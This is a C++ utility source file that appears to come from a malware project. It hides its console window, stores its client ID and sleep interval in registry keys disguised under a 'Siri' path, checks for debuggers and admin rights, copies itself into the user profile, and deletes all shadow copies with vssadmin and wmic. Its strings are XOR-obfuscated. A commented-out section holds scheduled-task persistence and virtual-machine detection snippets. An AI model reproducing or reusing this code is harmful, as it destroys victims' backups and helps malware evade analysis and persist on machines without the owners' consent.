#include "utils.hpp"

void hideWindow()
{
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);
}

int onlyMe()
{
	HANDLE mutex = CreateMutex(NULL, TRUE, sXOR("Armadillo1805"));

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(mutex);
		return 0;
	}
	return 1;
}

char *generateUUID()
{
	static char uuid[UUID_LENGTH + 1];
	const char *chars = "0123456789abcdef";
	int i;

	srand((unsigned int)time(NULL));

	for (i = 0; i < UUID_LENGTH; i++)
	{
		if (i == 8 || i == 13 || i == 18 || i == 23)
		{
			uuid[i] = '-';
		}
		else
		{
			uuid[i] = chars[rand() % RANDOM_RANGE];
		}
	}

	uuid[UUID_LENGTH] = '\0';
	return uuid;
}

void saveUUID()
{
	RegKey regkey = {
		HKEY_CURRENT_USER,
		sXOR("SOFTWARE\\MICROSOFT\\WINDOWS\\Application\\Siri"),
		sXOR("ClientID")};
	regkey.lpData = generateUUID();

	createRegKey(regkey);
}

char *getUUID()
{
	RegKey regkey = {
		HKEY_CURRENT_USER,
		sXOR("SOFTWARE\\MICROSOFT\\WINDOWS\\Application\\Siri"),
		sXOR("ClientID")};

	char *data = readRegKey(regkey);

	if (data == NULL)
	{
		regkey.lpData = generateUUID();
		createRegKey(regkey);
		return (char *)regkey.lpData;
	}

	return data;
}

void saveSleep(char *min)
{
	RegKey regkey = {
		HKEY_CURRENT_USER,
		sXOR("SOFTWARE\\MICROSOFT\\WINDOWS\\Application\\Armadillo"),
		sXOR("data1")};

	regkey.lpData = min;

	createRegKey(regkey);
}

int getSleep()
{
	RegKey regkey = {
		HKEY_CURRENT_USER,
		sXOR("SOFTWARE\\MICROSOFT\\WINDOWS\\Application\\Armadillo"),
		sXOR("data1")};

	char *data = readRegKey(regkey);

	if (data == NULL)
	{
		regkey.lpData = "30";
		createRegKey(regkey);
		return atoi(regkey.lpData) * 60 * 1000;
	}

	return atoi(data) * 60 * 1000;
}

void DeleteRestorePoints()
{
	system(sXOR("vssadmin delete shadows /all /quiet & wmic shadowcopy delete"));
}

bool isDebuggerPresent()
{
	PPEB PEB_Address = (PPEB)__readgsqword(0x60);
	return PEB_Address->BeingDebugged;
}

bool IsUserAdmin()
{
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(&NtAuthority, 2,
								 SECURITY_BUILTIN_DOMAIN_RID,
								 DOMAIN_ALIAS_RID_ADMINS,
								 0, 0, 0, 0, 0, 0,
								 &AdministratorsGroup);
	if (b)
	{
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
		{
			b = FALSE;
		}
		FreeSid(AdministratorsGroup);
	}
	return (b);
}

int isPrime(int num)
{
	if (num <= 1)
	{
		return 0;
	}
	for (int i = 2; i * i <= num; i++)
	{
		if (num % i == 0)
		{
			return 0;
		}
	}
	return 1;
}

int calculatePrimeNo(int n)
{
	int candidate = 2;
	int numPrimes = 0;

	while (numPrimes < n)
	{
		if (isPrime(candidate))
		{
			numPrimes++;
			if (numPrimes == n)
			{
				return candidate;
			}
		}
		candidate++;
	}
	return -1;
}

bool CopyFileTo(const char *fileName, const char *destDir)
{
	char srcPath[MAX_PATH];
	char destPath[MAX_PATH];

	// Get the path of the source file (file.txt)
	GetModuleFileName(NULL, srcPath, MAX_PATH);
	strncpy(destPath, destDir, MAX_PATH);

	// Append file name to destination directory
	strcat(destPath, "\\");
	strcat(destPath, fileName);

	// Copy the file to the destination directory
	if (CopyFile(srcPath, destPath, FALSE))
	{
		// printf("File '%s' copied successfully to: %s\n", fileName, destPath);
		return true;
	}
	else
	{
		// printf("Failed to copy file '%s'. Error code: %d\n", fileName, GetLastError());
		return false;
	}
}

int copyMyself(void)
{
	char szDestDir[MAX_PATH];
	HRESULT result;

	// Get the path of the user's home directory
	result = SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, szDestDir);
	if (result != S_OK)
	{
		// printf("Failed to get home directory path. Error code: %d\n", result);
		return EXIT_FAILURE;
	}

	// Append the desired folder name to the home directory path
	strcat(szDestDir, sXOR("\\ApplicationData"));

	// Create the folder in the home directory
	if (!CreateDirectory(szDestDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
	{
		// printf("Failed to create directory. Error code: %d\n", GetLastError());
		return EXIT_FAILURE;
	}

	// Copy the binary to the folder in the home directory
	if (!CopyFileTo(sXOR("1805.exe"), szDestDir))
		return EXIT_FAILURE;

	// Copy file.txt from the current directory to the folder in the home directory
	if (!CopyFileTo(sXOR("python310.dll"), szDestDir))
		return EXIT_FAILURE;

	if (!CopyFileTo(sXOR("python310.zip"), szDestDir))
		return EXIT_FAILURE;

	if (!CopyFileTo(sXOR("_ctypes.pyd"), szDestDir))
		return EXIT_FAILURE;

	return EXIT_SUCCESS;
}

/*
#include <windows.h>
#include <taskschd.h>
#include <comutil.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

int main() {

	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		printf("Failed to initialize COM library: %x\n", hr);
		return 1;
	}


	ITaskService *pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void **)&pService);
	if (FAILED(hr)) {
		printf("Failed to create Task Service: %x\n", hr);
		CoUninitialize();
		return 1;
	}


	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		printf("Failed to connect to Task Scheduler: %x\n", hr);
		pService->Release();
		CoUninitialize();
		return 1;
	}


	ITaskFolder *pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		printf("Failed to get root folder: %x\n", hr);
		pService->Release();
		CoUninitialize();
		return 1;
	}


	ITaskDefinition *pTaskDefinition = NULL;
	hr = pService->NewTask(0, &pTaskDefinition);
	if (FAILED(hr)) {
		printf("Failed to create task definition: %x\n", hr);
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}


	ITaskSettings *pSettings = NULL;
	hr = pTaskDefinition->get_Settings(&pSettings);
	if (FAILED(hr)) {
		printf("Failed to get task settings: %x\n", hr);
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	if (FAILED(hr)) {
		printf("Failed to set start when available: %x\n", hr);
		pSettings->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}


	IActionCollection *pActionCollection = NULL;
	hr = pTaskDefinition->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		printf("Failed to get action collection: %x\n", hr);
		pSettings->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	IAction *pAction = NULL;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	if (FAILED(hr)) {
		printf("Failed to create action: %x\n", hr);
		pActionCollection->Release();
		pSettings->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	IExecAction *pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void **)&pExecAction);
	if (FAILED(hr)) {
		printf("Failed to get exec action interface: %x\n", hr);
		pAction->Release();
		pActionCollection->Release();
		pSettings->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}
	hr = pExecAction->put_Path(_bstr_t(L"C:\\Path\\To\\Your\\Executable.exe"));
	if (FAILED(hr)) {
		printf("Failed to set action path: %x\n", hr);
		pExecAction->Release();
		pAction->Release();
		pActionCollection->Release();
		pSettings->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}


	IRegisteredTask *pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(_bstr_t(L"TaskName"), pTaskDefinition, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(), &pRegisteredTask);
	if (FAILED(hr)) {
		printf("Failed to register task definition: %x\n", hr);
		pExecAction->Release();
		pAction->Release();
		pActionCollection->Release();
		pSettings->Release();
		pTaskDefinition->Release();
		pRootFolder->Release();
		pService->Release();
		CoUninitialize();
		return 1;
	}


	pRegisteredTask->Release();
	pExecAction->Release();
	pAction->Release();
	pActionCollection->Release();
	pSettings->Release();
	pTaskDefinition->Release();
	pRootFolder->Release();
	pService->Release();
	CoUninitialize();

	printf("Task created successfully!\n");
	return 0;

	ULONG	AvGetCursorMovement(VOID)
{
	POINT	Point;
	ULONG	Movement = 0;

	GetCursorPos(&Point);

	if (g_Point.x && g_Point.y)
		Movement = Point.x - g_Point.y + ((Point.y - g_Point.y) << 16);

	g_Point.x = Point.x;
	g_Point.y = Point.y;

	return(Movement);
}
}

var virtualGpus = new List<string>()
			{
				"VirtualBox", "VBox", "VMware Virtual", "VMware", "Hyper-V Video"
			};

			var gpus = Information.GetGPUs();
			return _ = virtualGpus.Any(x => gpus.Any(y => y.Contains(x)));
*/
